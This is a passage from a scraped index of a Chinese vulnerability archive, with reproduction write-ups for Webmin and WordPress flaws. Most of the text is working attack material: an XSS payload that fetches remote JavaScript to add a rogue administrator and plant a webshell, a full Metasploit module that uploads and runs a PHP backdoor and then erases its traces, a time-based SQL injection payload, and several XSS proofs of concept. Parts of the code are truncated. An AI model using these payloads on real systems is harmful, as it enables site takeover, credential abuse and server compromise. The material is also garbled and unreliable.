https://0-sec.org:10000/password_change.cgi Command Result = uid=0(root) gid=0(root) groups=0(root) 四、参考链接 https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html https://www.exploit-db.com/exploits/47230 https://blog.firosolutions.com/exploits/webmin/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-15 21:43:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/1.html":{"url":"0day/Wordpress/1.html","title":"WordPress <= 5.2.3 绕过认证查看私密内容","keywords":"","body":"WordPress 一、漏洞简介 二、漏洞影响 三、复现过程 本地复现 WordPress GET /wordpress/?static=1&order=asc 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/2.html":{"url":"0day/Wordpress/2.html","title":"WordPress Google Review Slider 6.1 SQL Injection ","keywords":"","body":"WordPress Google Review Slider 6.1 SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 inurl:\"/wp-content/plugins/wp-google-places-review-slider/\" POC : GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=*** &taction=edit HTTP/1.1 sqlmap result sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests: --- Parameter: tid (GET) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM (SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edit 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 14:55:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/7.html":{"url":"0day/Wordpress/7.html","title":"（从xss到getshell） xss的深层次利用与探讨","keywords":"","body":"（从xss到getshell） xss的深层次利用与探讨 今天我们的网站上公布了大量的wp的xss，那么这篇文章就是深入探讨如何深入利用xss。 如果师傅们有什么新的思路或者姿势。可以通过邮箱联系我们进行讨论与交流 联系邮箱：ian@lcx.cc 通过js文件添加wp系统管理员 1、创建管理账号 举个例子，攻击者可以在其Web服务器上托管JavaScript文件，例如wpaddadmin [.] js（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“ attacker”，密码为“ attacker”。 // Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wordpress/wp-admin/user-new.php\"; var nonceRegex = /ser\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator var params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator\"; ajaxRequest = new XMLHttpRequest(); ajaxRequest.open(\"POST\", requestURL, true); ajaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); ajaxRequest.send(params); 然后，攻击者可以使用以下PoC插入JavaScript。 “\"&gt;&lt;img src=1 onerror=\"javascript&colon;(function () { var url = 'http://aaa.bbb.ccc.ddd/ wpaddadmin.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();\"&gt;” 图1.插入XSS代码以添加管理员帐户 具有高权限的受害者查看此帖子后，将创建管理员帐户“攻击者”。 图2. XSS代码被执行 图3. XSS代码创建的具有管理员权限的“攻击者”帐户 然后，攻击者可以将现有的php文件修改为Webshel​​l，并使用该Webshel​​l来控制Web服务器。 图4.使用攻击者的帐户添加一个Web Shell 图5.控制Web服务器 2、恶意命令执行 // Send a GET request to the URL '/wp-admin/plugin-editor.php?akisment/index.php', and extract the current 'nonce' value var ajaxRequest = new XMLHttpRequest(); var requestURL = \"/wp-admin/plugin-editor.php?file=akismet/index.php\" var nonceRegex = /ce\" value=\"([^\"]*?)\"/g; ajaxRequest.open(\"GET\", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; // Construct a POST query, using the previously extracted 'nonce' value, and update the content of the file 'akismet/index.php' with our tiny web shell var params = \"_wpnonce=\"+nonce+\"&newcontent=一旦此XSS被管理用户触发，我们应该能够通过向脚本 http://0-sec.org/wp-content/plugins/akismet/index.php 发送GET / POST请求来执行任意PHP代码，其中参数“ x”等于我们的PHP代码的“ base64_encode”。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 16:11:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/9.html":{"url":"0day/Wordpress/9.html","title":"（CVE-2017-6514）敏感信息泄漏","keywords":"","body":"（CVE-2017-6514）敏感信息泄漏 一、漏洞简介 二、漏洞影响 三、复现过程 CVE-2017-6514通过CFSECURITE查找获得WORDPRESS登录可能的源代码披露 http://www.0-sec.org/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.0-sec.org% 2F＆format = xml 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 17:02:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/8.html":{"url":"0day/Wordpress/8.html","title":"（CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit)","keywords":"","body":"（CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) 一、漏洞简介 WordPress通过5.0.3允许在wp_crop_image（）中进行路径遍历。攻击者（具有裁剪图像的特权）可以通过包含两个图像扩展名和../序列的文件名，例如以.jpg？/../../结尾的文件名，将输出图像写入任意目录。 file.jpg子字符串。 二、漏洞影响 三、复现过程 保存内容为xxx.md 并放到msf运行的目录下 ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'WordPress Crop-image Shell Upload', 'Description' => %q{ This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and MSF_LICENSE, 'Author' => [ 'RIPSTECH Technology', # Discovery 'Wilfried Becard ' # Metasploit module ], 'References' => [ [ 'CVE', '2019-8942' ], [ 'CVE', '2019-8943' ], [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/'] ], 'DisclosureDate' => 'Feb 19 2019', 'Platform' => 'php', 'Arch' => ARCH_PHP, 'Targets' => [['WordPress', {}]], 'DefaultTarget' => 0 )) register_options( [ OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']), OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with']) ]) end def check cookie = wordpress_login(username, password) if cookie.nil? store_valid_credential(user: username, private: password, proof: cookie) return CheckCode::Safe end CheckCode::Appears end def username datastore['USERNAME'] end def password datastore['PASSWORD'] end def get_wpnonce(cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? res.get_hidden_inputs.first[\"_wpnonce\"] end end def get_wpnonce2(image_id, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'post' => image_id, 'action' => \"edit\" } ) if res && res.code == 200 && res.body && !res.body.empty? tmp = res.get_hidden_inputs wpnonce2 = tmp[1].first[1] end end def get_current_theme uri = normalize_uri(datastore['TARGETURI']) res = send_request_cgi!( 'method' => 'GET', 'uri' => uri ) fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && !res.body.empty? theme = res.body.scan(/\\/wp-content\\/themes\\/(\\w+)\\//).flatten.first fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme theme end def get_ajaxnonce(cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'query-attachments', 'post_id' => '0', 'query[item]' => '43', 'query[orderby]' => 'date', 'query[order]' => 'DESC', 'query[posts_per_page]' => '40', 'query[paged]' => '1' } ) fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && !res.body.empty? a_nonce = res.body.scan(/\"edit\":\"(\\w+)\"/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce a_nonce end def upload_file(img_name, wp_nonce, cookie) img_data = %w[ FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F 74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00 10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00 3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69 6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D 20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09 08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D 27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06 09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01 02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1 15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06 07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00 01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09 23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37 38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E ] img_data = [img_data.join].pack('H*') img_name += '.jpg' boundary = \"#{rand_text_alphanumeric(rand(10) + 5)}\" post_data = \"--#{boundary}\\r\\n\" post_data 'POST', 'uri' => upload_uri, 'ctype' => \"multipart/form-data; boundary=#{boundary}\", 'data' => post_data, 'cookie' => cookie ) fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty? print_good(\"Image uploaded\") res = JSON.parse(res.body) image_id = res[\"data\"][\"id\"] update_nonce = res[\"data\"][\"nonces\"][\"update\"] filename = res[\"data\"][\"filename\"] return filename, image_id, update_nonce end def image_editor(img_name, ajax_nonce, image_id, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'image-editor', '_ajax_nonce' => ajax_nonce, 'postid' => image_id, 'history' => '[{\"c\":{\"x\":0,\"y\":0,\"w\":400,\"h\":300}}]', 'target' => 'all', 'context' => '', 'do' => 'save' } ) fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty? filename = res.body.scan(/(#{img_name}-\\S+)-/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename filename 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { '_wpnonce' => wpnonce2, 'action' => 'editpost', 'post_ID' => image_id, 'meta_input[_wp_attached_file]' => \"#{current_date}#{filename}#{path}\" } ) end def crop_image(image_id, ajax_nonce, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => 'crop-image', '_ajax_nonce' => ajax_nonce, 'id' => image_id, 'cropDetails[x1]' => 0, 'cropDetails[y1]' => 0, 'cropDetails[width]' => 400, 'cropDetails[height]' => 300, 'cropDetails[dst_width]' => 400, 'cropDetails[dst_height]' => 300 } ) end def include_theme(shell_name, cookie) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? wpnonce2 = res.body.scan(/name=\"_wpnonce\" value=\"(\\w+)\"/).flatten.first post_id = res.body.scan(/\"post\":{\"id\":(\\w+),/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id post_title = Rex::Text.rand_text_alpha(10) uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { '_wpnonce'=> wpnonce2, 'action' => 'editpost', 'post_ID' => post_id, 'post_title' => post_title, 'post_name' => post_title, 'meta_input[_wp_page_template]' => \"cropped-#{shell_name}.jpg\" } ) fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res && res.code == 302 post_id end end def check_for_base64(cookie, post_id) uri = normalize_uri(datastore['TARGETURI']) # Test if base64 is on target test_string = 'YmFzZTY0c3BvdHRlZAo=' res = send_request_cgi!( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'p' => post_id, '0' => \"echo #{test_string} | base64 -d\" } ) fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res && res.code == 200 && !res.body.empty? fail_with(Failure::NotFound, \"Can't find base64 decode on target\") unless res.body.include?(\"base64spotted\") # Execute payload with base64 decode @backdoor = Rex::Text.rand_text_alpha(10) encoded = Rex::Text.encode_base64(payload.encoded) res = send_request_cgi!( 'method' => 'GET', 'uri' => uri, 'cookie' => cookie, 'vars_get' => { 'p' => post_id, '0' => \"echo #{encoded} | base64 -d > #{@backdoor}.php\" } ) fail_with(Failure::NotFound, 'Failed to send payload to target') unless res && res.code == 200 && !res.body.empty? send_request_cgi( 'method' => 'GET', 'uri' => normalize_uri(datastore['TARGETURI'], \"#{@backdoor}.php\"), 'cookie' => cookie ) end def wp_cleanup(shell_name, post_id, cookie) print_status('Attempting to clean up files...') uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php') res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => \"query-attachments\" } ) fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res && res.code == 200 && !res.body.empty? infos = res.body.scan(/id\":(\\d+),.*filename\":\"cropped-#{shell_name}\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"cropped-x\".*?\"delete\":\"(\\w+)\".*\"id\":(\\d+),.*filename\":\"#{shell_name}\".*?\"delete\":\"(\\w+)\"/).flatten id1, id2, id3 = infos[0], infos[2], infos[4] delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5] for i in (0...6).step(2) res = send_request_cgi( 'method' => 'POST', 'uri' => uri, 'cookie' => cookie, 'vars_post' => { 'action' => \"delete-post\", 'id' => infos[i], '_wpnonce' => infos[i+1] } ) end uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri1, 'cookie' => cookie ) if res && res.code == 200 && res.body && !res.body.empty? post_nonce = res.body.scan(/post=#{post_id}&action=trash&_wpnonce=(\\w+)/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php') res = send_request_cgi( 'method' => 'GET', 'uri' => uri2, 'cookie' => cookie, 'vars_get' => { 'post' => post_id, 'action' => 'trash', '_wpnonce' => post_nonce } ) fail_with(Failure::NotFound, 'Unable to retrieve response') unless res && res.code == 302 res = send_request_cgi( 'method' => 'GET', 'uri' => uri1, 'cookie' => cookie, 'vars_get' => { 'post_status' => \"trash\", 'post_type' => 'post', '_wpnonce' => post_nonce } ) if res && res.code == 200 && res.body && !res.body.empty? nonce = res.body.scan(/post=#{post_id}&action=delete&_wpnonce=(\\w+)/).flatten.first fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce send_request_cgi( 'method' => 'GET', 'uri' => uri2, 'cookie' => cookie, 'vars_get' => { 'post' => post_id, 'action' => 'delete', '_wpnonce' => nonce } ) end end end def exploit fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online? print_status(\"Authenticating with WordPress using #{username}:#{password}...\") cookie = wordpress_login(username, password) fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil? print_good(\"Authenticated with WordPress\") store_valid_credential(user: username, private: password, proof: cookie) print_status(\"Preparing payload...\") @current_theme = get_current_theme wp_nonce = get_wpnonce(cookie) @current_date = Time.now.strftime(\"%Y/%m/\") img_name = Rex::Text.rand_text_alpha(10) @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie) ajax_nonce = get_ajaxnonce(cookie) @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie) wpnonce2 = get_wpnonce2(image_id, cookie) change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie) crop_image(image_id, ajax_nonce, cookie) @shell_name = Rex::Text.rand_text_alpha(10) change_path(wpnonce2, image_id, @filename1, @current_date, \"?/../../../../themes/#{@current_theme}/#{@shell_name}\", cookie) crop_image(image_id, ajax_nonce, cookie) print_status(\"Including into theme\") post_id = include_theme(@shell_name, cookie) check_for_base64(cookie, post_id) wp_cleanup(@shell_name, post_id, cookie) end def on_new_session(client) client.shell_command_token(\"rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\") client.shell_command_token(\"rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*\") client.shell_command_token(\"rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*\") client.shell_command_token(\"rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg\") client.shell_command_token(\"rm #{@backdoor}.php\") end end 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 16:53:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/6.html":{"url":"0day/Wordpress/6.html","title":"（CVE-2019-16219）内置编辑器Gutenberg 储存型xss","keywords":"","body":"（CVE-2019-16219）内置编辑器Gutenberg 储存型xss 一、漏洞简介 Gutenberg编辑器无法过滤“简码”错误消息中的JavaScript / HTML代码，导致可执行任意JavaScript / HTML代码 二、漏洞影响 wordpress 5.0到5.0.4、5.1和5.1.1 三、复现过程 在WordPress 5.0中，用户可以在帖子中添加Shortcode块。当在Shortcode块中添加某些HTML编码字符（例如“＆lt;”），然后重新打开该帖子时，它将显示错误消息，并通过将“＆lt;”解码为“ 图1.将HTML编码的字符插入Shortcode块 图2.带有预览的Shortcode错误消息 可以通过PoC \"&gt;&lt;img src=1 onerror=prompt(1)&gt; 轻松绕过此预览中的XSS过滤器。 图3.将PoC代码插入Shortcode块 当任何受害者查看此帖子时，XSS代码将在其浏览器中执行。 如果受害者恰巧具有管理员权限，则攻击者可以利用此漏洞来控制管理员的帐户，将WordPress内置功能用于GetShell，然后控制服务器。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 15:43:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/5.html":{"url":"0day/Wordpress/5.html","title":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss","keywords":"","body":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss 一、漏洞简介 适用于WordPress的3.2.7之前的“all-in-one-seo-pack plugin”插件（aka All in One SEO Pack）易受存储XSS的影响，原因是该插件通过不安全的占位符替换提供的帖子的SEO特定描述的编码不正确。 二、漏洞影响 wordpress 三、复现过程 1、利用过程 创建或编辑帖子时，可以设置以下值来显示漏洞： Title: test_aiosp_title&<>\"';>a Description: test_aiosp_desc&<>\"'; pt:%post_title% wp_title:%wp_title% bd:%blog_description% sd:%site_description% bt: %blog_title% st: %site_title% desc:%description% 当帖子被保存并以后访问时，将显示JavaScript警报弹出窗口。生成的HTML页面将包含以下代码 test_aiosp_title&amp;&lt;&gt;&quot;&#039;;&lt;script src=&#039;data:text/javascript,alert(1)&#039;&gt;&lt;/script&gt; | XXXXXXX \"'; wp_title:test_aiosp bd: sd: bt: XXXXXXX st: XXXXXXX desc:%description%\" /> 2、详细分析 该插件将几个字段添加到可以创建或编辑帖子的页面上。这样可以为每个帖子设置自定义标题和描述。此处提供的信息将插入meta到帖子页面上的相应-tags中。在将字段的值插入页面的HTML中之前，先对这些字段的值进行转义。 但是，在描述字段中，可以插入占位符，这些占位符在输出前已被某些值替换。也可以为前面提到的标题字段设置一个占位符。相关代码可以在 aioseop_class.php第4546-4548行中找到： if ( false !== strpos( $description, '%post_title%', 0 ) ) { $description = str_replace( '%post_title%', $this->get_aioseop_title( $post, false ), $description ); } 当攻击者在标题字段中设置有效负载并在描述字段中为标题字段的值提供占位符时，标题字段的原始值将被插入描述中。此后该描述未经过清理或编码。这使攻击者可以突破meta-tag属性并插入任意HTML和JavaScript。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 15:18:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/4.html":{"url":"0day/Wordpress/4.html","title":"（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR)  储存型xss","keywords":"","body":"（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss 一、漏洞简介 WordPress的3.0.6版eu-cookie-law插件（又称为EU Cookie法（GDPR））容易受到存储XSS的影响，原因是管理区域中几个配置选项的编码不正确以及显示的Cookie同意消息。这会影响“字体颜色”，“背景颜色”和“禁用Cookie”文本。具有高特权的攻击者可以攻击其他用户。 二、漏洞影响 wordpress 三、复现过程 /wp-admin/options-general.php?page=peadig_eucookie 管理员可以在配置区域为插件设置多个选项。在插入HTML页面之前，大多数都可以正确转义。但是，可以利用三个设置值来插入任意JavaScript和HTML。那些是： 字体颜色（ Font Color） 背景颜色 （Background Color） “禁用Cookie”文本 （\"Disable Cookie\" Text） “ Fontcolor”的值将插入到显示Cookie同意消息的每个页面上。默认情况下，其他两个仅可在管理区域中利用。 以“字体颜色”为例 将字体颜色的值设置为 #FFFFFF\">alert(1) 便可以突破HTML属性并插入script包含JavaScript 的标签 post包： POST /wp-admin/options.php HTTP / 1.1 [ ... ] [ ... ] peadig_eucookie％5 Bfontcolor％5 D = ％23FFFFFF％22％3E％3Cscript％3Ealert％281％29％3C / script％3E [...] 这时候我们看一下返回值。 在管理区域中，生成的HTML页面如下所示 alert(1) \" class=\"color-field\" data-default-color=\"#ffffff\"/> 在带有cookie消息的页面上，有效负载将被多次插入。生成的HTML如下所示 alert(1) ;background:rgb(0,0,0);background: rgba(0,0,0,0.85);\"> 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 15:12:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/3.html":{"url":"0day/Wordpress/3.html","title":"（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss","keywords":"","body":"（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss 一、漏洞简介 WordPress的5.9.5版以上的事件管理器插件（又名“事件管理器”）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。 二、漏洞影响 wordpress 三、复现过程 1、利用过程 要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置 map_style为的base64编码值 {\"a\":\"test\\\"alert(1)\"}。 这将导致以下简码： [locations_map test=\"\" map_style=\"eyJhIjoidGVzdFwiPC9zY3JpcHQ+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9Cg==\"] 然后可以将该短代码插入到帖子中，然后由恶意用户发布。任何访问该职位的人都会受到有效载荷的影响，因此是XSS攻击的受害者。 2、详细分析 Events Manager插件提供了用于创建地图小部件的短代码，例如用于显示事件的位置。通过map_style使用简码中的属性提供自定义样式，可以直观地调整这些地图。为了防止XSS ，在shortcode属性内使用HTML 受到限制。但是，在这种情况下，可以注入任意HTML和JavaScript，因为该 map_style属性需要一个以base64编码的JSON对象。这允许绕过消毒。简码locations_map和events_map受此问题影响： 在em-shortcode.php（第43-56行），我们可以看到该属性是经过base64解码的，然后使用json_decode进行了解析。如果JSON语法有效，则将删除空格并将对象作为map_json_style变量传递到模板。请参见下面的代码段： //add JSON style to map $style = ''; if( !empty($args['map_style']) ){ $style= base64_decode($args['map_style']); $style_json= json_decode($style); if( is_array($style_json) || is_object($style_json) ){ $style = preg_replace('/[\\r\\n\\t\\s]/', '', $style); }else{ $style = ''; } unset($args['map_style']); } ob_start(); em_locate_template('templates/map-global.php',true, array('args'=>$args, 'map_json_style' => $style)); 在templates/templates/map-global.php（第16-21行）中，变量无需进一步编码即可插入脚本标签内： if( typeof EM == 'object'){ if( typeof EM.google_map_id_styles != 'object' ) EM.google_map_id_styles = []; EM.google_map_id_styles[''] = ; } 这样就完美的构成了xss payload 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 19:40:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/10.html":{"url":"0day/Wordpress/10.html","title":"（CVE-2019-17671）Wordpress未授权访问","keywords":"","body":"（CVE-2019-17671）Wordpress未授权访问 一、漏洞简介 wordpress 爆出最新的查看未经身份验证的文章漏洞， 该漏洞源于程序没有正确处理静态查询， 攻击者可利用该漏洞未经认证查看部分内容 二、漏洞影响 WordPress 三、复现过程 登陆后台新建私密页面 随便填入内容，选择私密，发布 访问前台页面，退出登陆，模拟外部访问 漏洞利用 直接访问，查看不了私密文章 输入payload访问，即可未授权访问所有文章 url+/?static=1&order=asc 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-22 14:10:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/11.html":{"url":"0day/Wordpress/11.html","title":"（CVE-2019-19133）WordPress CSS Hero 4.0.3 反射xss","keywords":"","body":"（CVE-2019-19133）WordPress CSS Hero 4.0.3 反射xss 一、漏洞简介 二、漏洞影响 CSS Hero插件 ( 三、复现过程 首先WordPress应用中确保CSS Hero Plugin安装。 poc hxxp:// 0-sec.org/?csshero_action=edit_page&rand=1015&foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(%27Reflected%20XSS%20in%20CSS%20Hero%204.0.3%27)%3C/script%3E%3Ciframe%3Ebar 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-07 20:16:19 console.log(\"plugin-popup....\");document.onclick = 